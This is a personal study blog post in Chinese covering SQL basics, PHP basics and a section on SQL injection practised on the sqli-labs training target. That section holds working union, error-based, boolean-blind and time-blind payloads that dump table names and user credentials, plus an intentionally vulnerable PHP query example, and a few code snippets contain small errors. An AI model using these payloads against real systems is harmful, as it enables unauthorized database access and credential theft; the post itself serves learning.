---
title: 后端学习sql数据库管理、php语言、sql注入
date: 2024-11-22 22:26:52
comments: true
description: 学习记录
categories:
- 后端基础知识
- sql语言
- php语言
tags:
- php
- sql
---

# 后端学习sql数据库管理、php语言、sql注入(持续更新)

---
>参考
>
> <https://www.bilibili.com/video/BV16D4y167TT/?spm_id_from=333.880.my_history.page.click>
>
> <https://www.runoob.com/sql/sql-tutorial.html>
>
> <https://www.bilibili.com/video/BV1aS4y1W78p?p=2&vd_source=06887b49ed0996e8a27c4d84f89315d3>
>
> <https://blog.csdn.net/qq_55316925/article/details/129147618>
---

在web方向网络安全的渗透学习中，我发现如果仅仅只是为了做题的需要才去学习碎片的、部分的sql和php语言知识，是不成体系的，对之后的深入学习会造成阻碍

所以，系统地学习基本后端知识迫在眉睫，为之后的深入打好基础

## SQL数据库管理基础入门(基于phpstudy学习)

SQL（Structured Query Language）是一种用于管理和操作关系数据库的标准语言

包括数据查询、数据插入、数据更新、数据删除、数据库结构创建和修改等功能

### 一.使用phpstudy创建数据库并管理

phpstudy中点击软件管理，找到phpMyadmin下载它

下载好后点击数据库，点击创建数据库(不用root数据库)，设置数据库命名用户名密码

回到主页，启动Apache和Mysql，再点击数据库工具，选择phpMyadmin

![](https://www.helloimg.com/i/2024/11/22/6740a0351d80f.png)

之后你的浏览器会自动启动打开你的数据库可视化网站

![](https://www.helloimg.com/i/2024/11/22/6740a06fda84b.png)

在左边的栏点击你刚刚在phpstudy创建的新数据库

PS:传统的数据库的使用(比如在MySQL Workbench上操作)需要先创建数据库

`CREATE DATABASE 数据库名字;`

然后在指定的数据库上操作

`USE 数据库名字;`

### 二.在数据库里创建表格并管理

#### 1.创建表格

在右边的操作面板上方的菜单栏点击SQL，在下方的空白输入SQL语句

![](https://www.helloimg.com/i/2024/11/23/674182e754c32.png)

在这里我创建一个名为"apple1"的表格用来记录每天销售苹果的相关数据

该表格有很多列，每一列的列头需要定义列名和数据类型,以及修改或增加条件使得列具有特殊功能

```sql
CREATE TABLE apple1 (
    id INT AUTO_INCREMENT PRIMARY KEY,
    apple_type VARCHAR(10) NOT NULL,
    sold DATE NULL,
    apple_mass FLOAT
);
```

每一个语句(函数)用分号`;`隔开(大部分语言应该都是如此)

这里的创建表格内部相关内容要用`()`包含起来

在列名的定义中，最后一行不加逗号

`id INT AUTO_INCREMENT PRIMARY KEY,`

定义了每行的序号，是整型类型,后面`AUTO_INCREMENT`条件可以帮我们自动递增序号,不必每次手动输入,`PRIMARY KEY`主键设置,可以给这一列加上特殊的标识

>主键,是数据库表中用于唯一标识每一行记录的一个或一组字段,主键必须满足两个基本条件：
>
>唯一性：每个主键值在表中必须是唯一的，不能有重复值
>
>非空性：主键字段不允许为空（NULL）
>
>作用
>
>它会为被标记的数据创建特殊的索引,若是在表中搜索该类型的数据,可以大大提高搜索效率
>
>在日常生产工作中优化效率


`apple_type VARCHAR(10) NOT NULL,`定义了一列用来存放不同苹果的种类名字，是字符类型,`(10)`规定了表中列的最大长度,NOT NULL意思是该列是不能为空的,如果我们不填入数据直接执行会报错

`sold DATE NULL,`定义了一列存放每种苹果的销售日期,是sql特有的时间类型,NULL意味着该列可以不填入数据空着,没有设置条件的时候默认为空

`apple_mass FLOAT`定义了一列存放每种苹果卖出的总质量，质量经常不是整数，所以这里为浮点型

以上在数据类型后面设置条件并不是必要的,但是事先规定明确好,可以避免之后出现莫名其妙的报错

---

PS：这里列出一些日常管理中常用的数据类型

>数值类型:
>
>INT：广泛用于主键和外键，以及计数器等需要精确整数值的地方。
>
>FLOAT / DOUBLE：适用于需要处理小数点后几位数字的情况，例如财务计算中的金额。
>
>DECIMAL：在需要高精度的计算中使用，如金融交易，以避免浮点数运算带来的舍入误差。
>
>字符串类型：
>
>VARCHAR：非常适合存储长度可变的文本信息，如姓名、地址等。
>
>TEXT：用于存储较长的文本内容，比如文章、评论等。
>
>CHAR：适合存储固定长度的字符串，如电话号码格式化后的存储。
>
>日期和时间类型：
>
>DATETIME：记录事件发生的具体日期和时间，如订单创建时间。
>
>TIMESTAMP：记录事件的时间戳，特别是在需要记录数据更改时间或审计跟踪的情况下。
>
>DATE：仅记录日期，如出生日期。
>
>布尔类型：
>
>BOOLEAN：用于表示是/否、开/关等二元状态的信息，如用户是否激活账户。
>
>枚举类型：
>
>ENUM：当字段只能取有限个已知值时使用，例如性别（男/女）、状态（启用/禁用）等。
>
>二进制类型：
>
>BLOB：存储大型二进制对象，如图片、文档等多媒体文件。
>
>UUID/GUID类型：
>
>UUID：用于生成全局唯一的标识符，特别适用于分布式系统中，避免主键冲突。
>
---

#### 2.填充数据并修改表格

以上直接执行可以成功,但是没有数据,我们需要学会手动传入数据进表格

在上述创建代码后面补上这些

```sql
INSERT INTO study1.apple1 (id,apple_type,sold,apple_mass)
VALUES 
(1,'白苹果','2024-01-01',50.02),
(2,'黑苹果','2024-01-02',48.99),
(DEFAULT,'小苹果',NULL,50.33);
```

`INSERT`插入数据关键字,后面要标明要填充数据的哪个库的哪个表的哪些列

`VALUES`具体数据关键字,后面用`()`包含对应的数据组,`,`隔开,`;`结尾

特殊的字符串类型需要用单引号括起来

![](https://www.helloimg.com/i/2024/11/23/674194a7406a1.png)

假设我们突然需要临时增加一个列,还想更新一些老旧的数据

```sql
ALTER TABLE study1.apple1
ADD favorable_rate FLOAT NULL; --好评率

UPDATE study1.apple1
SET apple_mass = 100.00 --重设数据
WHERE id = 2; --根据前面的主键设定,我们使用WHERE定位具体的重设行
```

![](https://www.helloimg.com/i/2024/11/23/674198b04aa80.png)

某一天我突然喜新厌旧,不想要好评率列和第一行了,删除它们可以这样子

删除行的写法

```sql
DELETE FROM study1.apple1
WHERE id=1;
```

删除列的写法

```sql
ALTER TABLE study1.apple1
DROP favorable_rate;
```

![](https://www.helloimg.com/i/2024/11/23/67419b59091b9.png)

现在我还想删除整个表格

`DROP TABLE study1.apple1`

我已经受不了996的生活了，更进一步，我要删库跑路(doge)

`DROP DATABASE study1`

### 三.数据的查询选择过滤

为了方便练习数据查询，我从网上找了两张表,某段时间全球新冠感染人数的月份表和汇总表

<https://gitee.com/eggtoopain/my-sql-introductory-courseware/blob/master/Egg_database.sql#>

#### 1.查询、选择、过滤

`SELECT * FROM 表格名`从某个表格查询它的全部内容，`*`全选

`SELECT 列名1,列名2 FROM 表格名`从某个表格中只查看某两列的内容

在一列中经常出现某个些数据重复出现的情况，我们想知道有多少种不同的数据，可以使用DISTINCT关键字

`SELECT DISTINCT 列名 FROM 表格`

直接查询数据，我们会发现它们并没有根据序号id去排序，我们需要给它指定一下排序的依据

`SELECT * FROM 表格 ORDER BY 列名 ASC`

`ORDER BY 列名`根据某列进行排序

有ASC(ascending)从低到高和DESC(descending)从高到低两种排序，不设置默认是ASC

这样子查询是没有经过过滤的，信息还是不够精简，使用WHERE进行过滤

这里举一个例子，查询月总表的恢复数大于等于1000000的数据，同时根据Confirmed从高到低排序

```sql
SELECT *
FROM Covid_month
WHERE Recovered >=1000000
ORDER BY Confirmed DESC;
```

![QQ截图20241123175417.png](https://www.helloimg.com/i/2024/11/23/6741a54635d62.png)

事实上，where需要配合一些运算符使用才更好用，这里举一些sql中的运算符

>比较运算符
>
>=
>
> !=或<>
>
> \>
>
> \<
>
> \>=
>
> \<=
>
> BETWEEN 两值之间
>
> IN 一组值里
>
> LIKE 相似匹配
>
>逻辑运算符
>
> AND 与
>
> OR 或
>
> NOT或! 非

现在在上面查询的基础上，我想看低于1000000的数据且不想看到巴西的相关数据，可以这样子写

`WHERE NOT Recovered >=1000000 AND Country != 'Brazil'`

我们可以这样这样子理解这段代码，AND左右两边条件得到的值是布尔值，两边都为真时才输出结果

而NOT写在所有条件前面，对最终得到的布尔值进行取反，得到一个相反的结果

我们如果要查看一个区间内的数据，即数值范围，可以写

`WHERE Recovered BETWEEN 1000000 AND 1500000`

想看字符范围内的数据，比如我只想看巴西和印度这两个国家的数据，可以写

`WHERE Country IN ('Brazil','India')`

记性不太好的理科生，可能记不住某个需要查询的数据的全称，我们可以使用LIKE进行模糊搜索

```sql
WHERE Coutry LIKE `B%` --以B开头的国家
WHERE Coutry LIKE `%a` --以a结尾的国家
WHERE Coutry LIKE `__b%` --第三个字符为b的国家，用_表示未知字符,用%表示一大串未知的字符串
```

### 四.合并表格

有这几种常见的合并方式，INNER JOIN、LEFT JOIN、RIGHT JOIN、FULL OUTER JOIN、UNION

#### 1.INNER JOIN(取交集)

INNER JOIN 的效果是返回两个表中满足连接条件的行。如果某个表中的行在另一个表中没有匹配的行，则该行不会出现在结果集(两表的交集)中

语法

```sql
SELECT columns
FROM table1
INNER JOIN table2
ON table1.column = table2.column; --on关键字查询两表中的相同部分，以此为基准进行column的重组合并
```

输出的时候，结果集的左边是table1的一部分，右边是table2的一部分

这里我们需要创建两个简单的表格以便于学习理解

```sql
CREATE TABLE employees (
    employee_id INT PRIMARY KEY,
    first_name VARCHAR(50),
    last_name VARCHAR(50),
    department_id INT
);

CREATE TABLE departments (
    department_id INT PRIMARY KEY,
    department_name VARCHAR(50)
);

INSERT INTO employees (employee_id, first_name, last_name, department_id) VALUES
(1, '张三', '张', 1),
(2, '李四', '李', 2),
(3, '王五', '王', 1),
(4, '赵六', '赵', NULL); -- 没有分配部门的员工

INSERT INTO departments (department_id, department_name) VALUES
(1, '销售部'),
(2, '技术部'),
(3, '市场部'); -- 没有员工的部门
```

![QQ截图20241124153730.png](https://www.helloimg.com/i/2024/11/24/6742d6ca06336.png)

![QQ截图20241124153739.png](https://www.helloimg.com/i/2024/11/24/6742d6ca11fa9.png)

合并

```sql
SELECT employees.first_name, employees.last_name, departments.department_name
FROM employees
INNER JOIN departments
ON employees.department_id = departments.department_id;
```

![QQ截图20241124153947.png](https://www.helloimg.com/i/2024/11/24/6742d7312a799.png)

结果解释

读取表数据：

-- employees 表中有4行数据

-- departments 表中有3行数据

应用连接条件：

-- 连接条件是 employees.department_id = departments.department_id

生成中间结果集：

-- 中间结果集包含以下行：

--- employee_id = 1的行 和 department_id = 1的行

--- employee_id = 2的行 和 department_id = 2的行

--- employee_id = 3的行 和 department_id = 1的行

我们可以看看中间集是什么样子的

![QQ截图20241124154356.png](https://www.helloimg.com/i/2024/11/24/6742d8328de78.png)

选择输出列：

-- 选择 first_name、last_name 和 department_name 列

返回最终结果：

-- 最终结果集只包含满足连接条件的行

#### 2.LEFT JOIN

语法

```sql
SELECT columns
FROM table1
LEFT JOIN table2
ON table1.column = table2.column;
```

table1从table2的左边连接过去

LEFT JOIN 返回左表中的所有行，以及右表中满足连接条件的行。如果右表中没有匹配的行，则结果集中对应的位置显示为 NULL

在这里我以上面INNER JOIN的代码基础修改以便看出差别

```sql
SELECT employees.first_name, employees.last_name, departments.department_name
FROM employees
LEFT JOIN departments
ON employees.department_id = departments.department_id;
```

![QQ截图20241124155503.png](https://www.helloimg.com/i/2024/11/24/6742dac41effc.png)

很明显，赵六的行被保留下来了，右边没有可以合并的数据直接为NULL

RIGHT UNION的效果跟上类似，不过多赘述

#### 3.FULL OUTER JOIN(取并集)

它不管左右两边有没有对应的数据，直接强行合并，没有的数据就标为NULL

```sql
SELECT *
FROM employees
FULL OUTER JOIN departments
ON employees.department_id = departments.department_id;
```

由于MySQL不支持FULL OUTER JOIN，所以这里没有演示图可以看，但是知道有这样子的操作就行了

#### 4.UNION

上述都是表格的左右拼接，而UNION是两个上下拼接，默认去除完全重复的行

有几个关键特性：

去重：默认情况下，UNION 会去除结果集中重复的行

列数相同：所有 SELECT 语句中的列数必须相同

列类型兼容：所有 SELECT 语句中的对应列的数据类型必须兼容

这里我们再创建两个新的合适的表以便于学习

```sql
CREATE TABLE employees (
    employee_id INT PRIMARY KEY,
    first_name VARCHAR(50),
    last_name VARCHAR(50),
    department_id INT
);

CREATE TABLE managers (
    manager_id INT PRIMARY KEY,
    first_name VARCHAR(50),
    last_name VARCHAR(50),
    department_id INT
);

INSERT INTO employees (employee_id, first_name, last_name, department_id) VALUES
(1, '张三', '张', 1),
(2, '李四', '李', 2),
(3, '王五', '王', 1);

INSERT INTO managers (manager_id, first_name, last_name, department_id) VALUES
(1, '赵六', '赵', 1),
(2, '钱七', '钱', 2);
```

合并

```sql
SELECT *
FROM employees
UNION
SELECT *
FROM managers;
```

![QQ截图20241124161645.png](https://www.helloimg.com/i/2024/11/24/6742dfdf63875.png)

日常中还可以用ORDER进行一下排序以便于查看

## SQL注入

### 一.基础知识

攻击者通过在输入字段中插入恶意的SQL代码，从而操纵数据库查询，获取未经授权的数据或执行未授权的操作。SQL注入通常发生在应用程序没有正确验证和处理用户输入的情况下

按查询字段分类为字符型和数字型

字符型注入包含字符串的拼接，数字型注入特殊数值或逻辑表达式（如 1 OR 1=1），或者数值比较的痕迹

注入方法分为Union注入，报错注入，布尔注入，时间注入

闭合方式，这是sql注入的关键，有`'`,`"`,`")`,其他

手工提交闭合符，结束前一段查询语句，后面可以加入其它语句，查询需要的参数，不要的语句用注释符号`--`,`#`等关掉(通常使用`--+`进行注入，因为`+`会被解析为一个空格，防止`--`直接与后端代码连接导致报错)

### 二.Union注入

UNION注入是一种SQL注入技术，攻击者通过在输入字段中插入恶意的SQL代码，利用 UNION 操作符将多个查询结果合并，从而获取更多的数据或执行未授权的操作。UNION 操作符允许将两个或多个 SELECT 语句的结果集合并成一个结果集

UNION注入的条件和上面UNION合并的使用相同

举例

假设有一个简单的搜索功能，用户可以输入一个产品ID来查找产品信息。后端代码如下：

```php
$product_id = $_GET['product_id'];

$query = "SELECT product_name, price FROM products WHERE product_id = $product_id";
```

攻击者在 product_id 字段中输入 1 UNION SELECT username, password FROM users，查询将变为：

```sql
SELECT product_name, price FROM products WHERE product_id = 1 UNION SELECT username, password FROM users;
```

可能返回

```plaintext
product_name | price
-------------|------
Product A    | 10.99
username1    | password1
username2    | password2
```

#### 1.判断类型

注入

`?id=1 and 1=1 跟?id=1 and 1=2`

都没有报错，说明是字符型，反之数字型

我们还需要去确定后端表单的列数，才能够使用UNION

#### 2.确定表单列数方法

##### (1)使用NULL值

用 NULL 值代替具体的数据，逐步增加列数

在sqllabs的第一关我们可以这样子写(默认是字符型)

`id=1' UNION SELECT NULL --+`

返回The used SELECT statements have a different number of columns

我们再增加一列,两列，三列

```
id=1' UNION SELECT NULL, NULL --+
id=1' UNION SELECT NULL, NULL, NULL --+
```

根据返回结果

```
Your Login name:Dumb
Your Password:Dumb
```

可以确定出列数

##### (2)ORDER BY 或GROUP BY

```
id=1' ORDER BY X --+
id=1' GROUP BY X --+
```

X是未知正整数，从1递增一个个根据返回结果试

#### 3.查询回显位

输入

`id=1' UNION SELECT 1,2,3 --+`

在它后端系统实际呈现的结果集

第一行是它内部表单id=1的一个数据行

第二行就是我们输入的1，2，3排成3列

但是实际网页返回的结果只会取结果集的第一行，导致页面可能不发生改变，我们输入的内容并不会呈现出来

如果不把我们注入进去的结果给返回出来，我们就毫无进展，于是要让结果集第一行的默认数据给去掉，我们可以去查询一个根本不存在的id，它就不会显示占用第一行

`id=-1' UNION SELECT 1,2,3 --+`

这时候可能我们的结果就会有所表示，比如

![QQ截图20241124192755.png](https://www.helloimg.com/i/2024/11/24/67430ca82cd42.png)

我们就会发现输出的只有2，3列，第一列不输出，说明2，3列是回显位

那么之后我们需要在2，3位注入代码才会返回结果

比如我们想知道它后端数据库的名字

`id=-1' UNION SELECT 1,2,database() --+`

![QQ截图20241124193228.png](https://www.helloimg.com/i/2024/11/24/67430dc35d01f.png)

其它可以使用的关键字

>version():查看数据库版本
>
>database():查看使用的数据库
>
>user():查看当前用户
>
>limit:limit子句分批来获取所有数据
>
>group_concat():一次性获取所有的数据库信息,将查询到结果连接起来成一行
>
>information_schema.tables:特殊表单，包含了数据库里所有的表名
>
>information_schema.tables:特殊表单，包含了数据库里所有的列名
>
>table_name:表名
>
>table_schema:数据库名
>
>column_name:字段名

#### 4.UNION爆表

输入

`?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+`

将返回security下的所有表单名字，猜测所有账号密码应该在users里面

![](https://img2020.cnblogs.com/blog/2075370/202010/2075370-20201001191039433-1928732598.png)

输入

`?id=-1' union select 1,2,group_concat(column_name)from information_schema.columns where table_name='users'--+`

返回users表单的所有列名id,password,username

输入

`?id=-1' union select 1,2,group_concat(0x5c,username,0x5c,password) from users--+`

其中0x5c是`\`的十六进制表示，以隔开不同数据防止混淆

### 三.报错注入

通过在SQL查询中注入特定的恶意代码，使数据库返回错误信息。这些错误信息通常包含有关数据库结构和内容的详细信息，攻击者可以利用这些信息进一步攻击系统

如果页面没有回显位，无法使用UNION进行输出结果，但是可以报错，那么报错本身就是信息的一个输出，我们可以从报错入手，让系统主动通过报错给我们暴露信息

常见报错注入函数
1. updatexml

语法

UPDATEXML(target_xml, xpath_expression, new_xml)

target_xml：要更新的 XML 文档

xpath_expression：用于指定要更新的节点的 XPath 表达式

new_xml：新的 XML 片段，用于替换指定节点的内容

updatexml(1,1,1) 一共可以接收三个参数，报错位置在第二个参数

使用方法：

`?id=1' and updatexml(1,concat(0x7e,(select user()),0x7e),1) --+`

0x7e为`~`

它的用法跟extractvalue差不多

2. extractvalue

函数本身用法

`EXTRACTVALUE(xml_target, xpath_expression)`

xml_target：要从中提取值的 XML 文档

xpath_expression：用于指定要提取的节点的 XPath 表达式

在报错注入中，通过构造一个无效的 XPath 表达式，使 EXTRACTVALUE 函数触发数据库错误。错误信息中通常会包含有关数据库结构和内容的信息

如果把查询参数路径写错，查不到内容，但不会报错

如果把查询参数格式符号写错，会提示报错

`extractvalue(1,1) 一共可以接收两个参数，报错位置在第二个参数`

使用方法：

`?id=1' and extractvalue(1,concat((select user()))) --+`

3. ST_LatFromGeoHash()

`?id=1' and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))--+`

4. ST_LongFromGeoHash
`?id=1' and ST_LongFromGeoHash(concat(0x7e,(select user()),0x7e))--+`

5. GTID 

1.关于GTID：

GTID是MySQL数据库每次提交事务后生成的一个全局事务标识符，GTID不仅在本服务器上是唯一的，其在复制拓扑中也是唯一的。

2.GTID_SUBSET() 和 GTID_SUBTRACT()函数可以拿来实现报错注入：

函数详解：

GTID_SUBSET() 和 GTID_SUBTRACT() 函数，我们知道他的输入值是 GTIDset ，当输入有误时，就会报错

GTID_SUBSET( set1 , set2 ) - 若在 set1 中的 GTID，也在 set2 中，返回 true，否则返回 false ( set1 是 set2 的子集)

GTID_SUBTRACT( set1 , set2 ) - 返回在 set1 中，不在 set2 中的 GTID 集合 ( set1 与 set2 的差集)

```
#GTID_SUBSET函数

gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e),1)--+
 
#GTID_SUBTRACT函数

gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e),1)--+
```

6.ST_Pointfromgeohash

`?id=1' and  ST_PointFromGeoHash(version(),1)--+`

7.floor注入

`(select 1 from (select count(*),concat(回显查询位置,floor(rand(0)*2))x from information_schema.tables group by x)a)--+`

### 四.布尔盲注

通过观察应用程序对不同SQL查询的响应来推断数据库的内容。与传统的报错注入不同，布尔盲注不会直接触发数据库错误，而是通过应用程序的逻辑响应（通常是页面内容的变化或HTTP状态码的变化）来判断查询的结果

页面没有回显位，没有报错返回，但是对于错误和正确结果有不同反应，可以试试布尔盲注

需要的函数

ascii()用于返回给定字符的 ASCII 码值

可以构造

`?id=1 and ascii(substr((select database()),1,1))>=100 --+`

得到数据库名字后提取它的第一个字符转换为ascii码与100比较，我们通过不断调整数值(二分法)最终得到具体的码

我们也可以把select database()换成别的我们需要查找的数据，比如看看所有的表单名字

`?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>=100 --+`

这里把group_concat换成limit，从第0行就开始输出，最终控制字符长度为1个

### 五.时间盲注

通过在SQL查询中引入时间延迟函数（如 SLEEP 或 BENCHMARK），观察应用程序的响应时间来推断数据库的内容。与布尔盲注不同，时间盲注不需要应用程序返回具体的错误信息或页面内容变化，而是通过响应时间的变化来判断查询结果

web页面只返回一个正常页面，利用页面响应时间不同，逐个猜解数据

在这种情况下，进行判断类型就应该这样子

`?id=1' and sleep(3) --+`

如果网页过了3秒钟才返回内容，说明闭合符就是`'`，如果马上返回，说明不是，我们要换个闭合符试试看

我们还需要用到if函数

IF(condition, true_value, false_value)

condition：一个布尔表达式，如果为真（非零），则返回 true_value；否则返回 false_value

true_value：当条件为真时返回的值

false_value：当条件为假时返回的值

这时候就可以构造

`?id=1' and if(ascii(substr(select database()),1,1)>100,sleep(0),sleep(3))--+`

跟布尔一样，还是一个个猜字符，只是换了个方式

---

先到这里，sql注入的基础内容算是学完了

## PHP语言学习

PHP（Hypertext Preprocessor）是一种开源的、服务器端的脚本语言，特别适用于Web开发并可以嵌入HTML中。它最初由Rasmus Lerdorf在1994年创建，随着时间的发展，PHP已经成为一种功能强大的编程语言，支持面向对象编程和多种数据库连接

### 基本背景知识了解

#### (1)静态网站访问流程(比如个人博客)

在这里只对现代日常家用电脑的访问过程进行分析

用户在个人电脑PC上打开浏览器软件，网址栏输入某个静态网站的URL(俗称网址，统一资源定位，是互联网上的绝对路径)，访问请求实际上不会直接到达目标服务器上，而是先经过DNS服务器解析

先是去访问本地DNS即hosts文件，如果是本地的静态网站，该文件DNS解析为本地ip(如127.0.0.1)，会从本地电脑找对应静态网站的服务器资源文件

如果找不到，就会去访问外部的网络DNS，然后DNS解析出ip地址返回给个人电脑，浏览器通过ip找到服务器位置

之后通过端口去访问服务器的服务软件(如Apache),服务软件会看你端口后面要访问的URI(统一资源标识，目标服务器机器上相对某个文件夹的相对路径，如index.html)，从服务器存储的网站资源搜索该文件并读取内容，Apache返回给个人电脑浏览器

浏览器会经过解析，变成具象的画面呈现给用户

![QQ截图20241201142824.png](https://www.helloimg.com/i/2024/12/01/674c011394294.png)

#### (2)动态网站访问流程(比如日常使用的b站等强交互网站)

比静态多了服务端解析和数据库

大体流程跟静态差不多的，有几个差别

URL里面的URI通常有php文件如index.php

服务器端需要调用php引擎去解析php文件变成HTML内容给Apache，同时调用数据库(另一个数据库服务器)进行数据处理，处理好再返回给个人电脑

![QQ截图20241201151149.png](https://www.helloimg.com/i/2024/12/01/674c0b145d4c8.png)

所以php语言在动态网站的后端中用的是最广泛的

### 1.使用phpstudy写个Hello, PHPStudy!测试环境

打开phpstudy的根目录下的WWW文件，创建一个新的文件夹来放学习测试用的php文件，在这里面我们可以创建一个比如名为index.php的文件

在里面写入

```php
<?php
// 这是一个简单的 PHP 脚本示例
echo "Hello, PHPStudy!";
?>
```

打开phpstudy点击网站，创建一个新网站，域名随便，端口跟前几个网站不一样就可以，根目录选择我们刚刚在WWW下面创建的新文件夹

回到主页重启Apache和Mysql

然后点击你网站右边的管理，选择打开网站，如果自动打开浏览器显示`Hello, PHPStudy!`,说明基本环境没问题

### 2.php代码标记

由于写php的过程中经常有不同类型的语言嵌入，所以为了区分出php代码部分，我们需要进行一些特殊的标记以作区分

在历史发展中，有这几种标记

1.ASP标记(弃用)

ASP 风格的标记类似于 Microsoft 的 Active Server Pages 使用的标记。这种标记形式已经被废弃，并且从 PHP 7.0.0 开始不再支持。

```
<%
    // PHP 代码放在这里
    echo "Hello, World!";
%>
```

2.短标记(弃用)

短标记是一种更简短的标记形式，但它们的使用取决于 php.ini 配置文件中的 short_open_tag 指令是否开启。默认情况下，在 PHP 5.4.0 及以上版本中，这个设置是开启的

```
<?
    // PHP 代码放在这里
    echo "Hello, World!";
?>
```

3.脚本标记

```
<script language="php">

echo "Hello, World!";

</script>
```

4.标准标记(目前主流)

```
<?php
    // PHP 代码放在这里
    echo "Hello, World!";
?>
```

### 3.php注释和分隔符

行注释:`//`,`#`

块注释:`/* 代码 */`

分隔符:`;`

### 4.php的变量

1.基本规则了解

PHP 没有声明变量的命令，变量在你第一次赋值给它的时候被创建

php中的所有变量前面要使用`$`符号

PHP 是一门弱类型语言，不必向 PHP 声明该变量的数据类型，PHP 会根据变量的值，自动把变量转换为正确的数据类型(简直就是c/c++玩家的福音)

使用`echo`可以输出变量的值，输出多个内容用`,`分隔

不想要变量可以使用`unset(变量名删除)`，举例

```
<?php

    $a=1;
    echo $a;
    unset($a);
    echo $a;

?>

第一次输出1，第二次输出失败，提示找不到该变量

2.变量命名规则

变量以 $ 符号开始，后面跟着变量的名称

变量名必须以字母或者下划线字符开始

变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ）

变量名不能包含空格

变量名是区分大小写的（$y 和 $Y 是两个不同的变量）

3.预定义变量

PHP 中的预定义变量（也称为超级全局变量）是内置的特殊变量(都是数组)，它们在脚本的所有作用域中都可用。这些变量由 PHP 自动创建，用于存储各种信息，如请求数据、环境信息、服务器信息等。以下是 PHP 中常见的预定义变量：

(1)`$_GET`：
   - 包含通过 URL 参数传递给当前脚本的变量（即查询字符串）。它是数组形式，键为参数名，值为参数值。
   ```php
   // 如果 URL 是 http://example.com/index.php?name=John
   echo $_GET['name']; // 输出: John
   ```

(2)`$_POST`：
   - 用于收集 HTML 表单中的 POST 方法提交的数据。它也是一个数组。
   ```php
   if ($_SERVER["REQUEST_METHOD"] == "POST") {
       // 处理表单数据
       $name = $_POST['name'];
   }
   ```

(3)`$_REQUEST`：
   - 包含 `$_GET`、`$_POST` 和 `$_COOKIE` 的内容。默认情况下，`$_GET` 和 `$_POST` 的优先级高于 `$_COOKIE`，但可以通过修改 php.ini 来改变这一点。

(4)`$_FILES`：
   - 用于处理文件上传。它是一个多维数组，包含了关于每个上传文件的信息，如名称、类型、大小、临时路径等。
   ```php
   if ($_FILES["file"]["error"] == UPLOAD_ERR_OK) {
       // 文件上传成功，可以进一步处理
   }
   ```

(5)`$_COOKIE`：
   - 存储通过 HTTP Cookies 提交到脚本的数据。它也是数组形式。
   ```php
   setcookie("user", "John", time() + (86400 * 30), "/"); // 设置一个 cookie
   echo $_COOKIE['user']; // 获取并输出 cookie 值
   ```

(6)`$_SESSION`：
   - 用于存储会话信息。会话变量在页面之间保持用户数据。使用前需要调用 `session_start()` 函数来启动会话。
   ```php
   session_start();
   $_SESSION['username'] = 'John'; // 设置会话变量
   echo $_SESSION['username']; // 输出会话变量
   ```

(7)`$_SERVER`：
   - 包含了服务器和执行环境的信息。这是一个关联数组，包含了诸如头信息（header）、路径（path）、脚本位置等信息。
   ```php
   echo $_SERVER['PHP_SELF']; // 当前正在执行脚本的文件名
   echo $_SERVER['HTTP_HOST']; // 当前请求的主机头
   echo $_SERVER['REMOTE_ADDR']; // 客户端 IP 地址
   ```

(8)`$GLOBALS`：
   - 包含了所有全局范围内的变量。这是一个关联数组，其中键是变量名，值是变量的内容。任何全局范围内的变量都可以通过 `$GLOBALS` 访问。
   ```php
   $x = 10;
   function myTest() {
       echo $GLOBALS['x'];
   }
   myTest(); // 输出: 10
   ```

(9)`$_ENV`：
   - 包含了运行环境中设置的环境变量。它的可用性取决于 PHP 配置和服务器环境。

超全局变量的作用域：所有上述提到的预定义变量都是“超全局”的，意味着它们可以在函数或方法内部直接访问，而无需使用 `global` 关键字。

4.可变变量

在 PHP 中，可变变量（variable variables）是一种特殊的变量类型，它允许你通过一个变量的值来动态地访问另一个变量。换句话说，可变变量的名字是存储在另一个变量中的。这种特性可以让你创建更加灵活和动态的代码结构，但也增加了代码的复杂性和潜在的安全风险。

(1)基本语法

要使用可变变量，只需在变量名前加上额外的 `$` 符号。例如：

```php
$var_name = "hello";
$$var_name = "world"; // 这等同于 $hello = "world";

echo $hello; // 输出: world
```

在这个例子中，`$var_name` 的值是 `"hello"`，因此 `$$var_name` 实际上引用的是名为 `$hello` 的变量。当我们将 `"world"` 赋值给 `$$var_name` 时，实际上是将 `"world"` 赋值给了 `$hello`。

(2)可变变量与数组

可变变量也可以与数组结合使用。例如：

```php
$array = array("one", "two", "three");
$name = "array";
echo $$name[1]; // 输出: two
```

在这个例子中，`$$name` 实际上引用的是 `$array`，而 `$$name[1]` 则相当于 `$array[1]`，输出 `"two"`。

(3)可变变量与函数返回值

你可以将函数的返回值用作可变变量的名字。例如：

```php
function getVarName() {
    return "greeting";
}

$$getVarName() = "Hello, World!";
echo $greeting; // 输出: Hello, World!
```

5.变量传值

在 PHP 中，变量传值是指将一个变量的值传递给另一个变量、函数参数或返回值。PHP 支持两种主要的传值方式：按值传递和按引用传递。了解这两种方式的区别对于编写高效且无错误的代码非常重要。

(1)按值传递 (Pass by Value)

当变量是按值传递时，实际上是创建了原始变量的一个副本，并将这个副本传递给接收方（例如函数参数）。这意味着对副本所做的任何修改都不会影响原始变量。

示例：

```php
function addOne($num) {
    $num = $num + 1;
}

$original = 5;
addOne($original);
echo $original; // 输出: 5
```

在这个例子中，`$original` 的值是 `5`。当我们调用 `addOne($original)` 时，`$original` 的值被复制并传递给函数参数 `$num`。在函数内部对 `$num` 进行的操作不会影响到 `$original`，因此最终输出仍然是 `5`。

(2)按引用传递 (Pass by Reference)

当变量是按引用传递时，传递的是变量本身的引用（即内存地址），而不是它的值。这意味着对传递的变量所做的任何修改都会反映在原始变量上。

示例：

```php
function addOne(&$num) {
    $num = $num + 1;
}

$original = 5;
addOne($original);
echo $original; // 输出: 6
```

在这个例子中，通过在函数参数前加上 `&` 符号，我们告诉 PHP 按引用传递 `$original`。因此，在函数内部对 `$num` 的修改会影响到 `$original`，最终输出为 `6`。

(3)返回值

函数可以返回一个值，这个值可以被赋值给另一个变量。返回值可以是按值返回，也可以是按引用返回。

(4)按值返回：

```php
function getNumber() {
    return 10;
}

$number = getNumber();
echo $number; // 输出: 10
```

(5)按引用返回：

要让函数按引用返回值，可以在 `return` 关键字前加上 `&`，并且在调用函数时也要使用 `&` 来获取引用。

```php
function &getArray() {
    static $arr = array();
    return $arr;
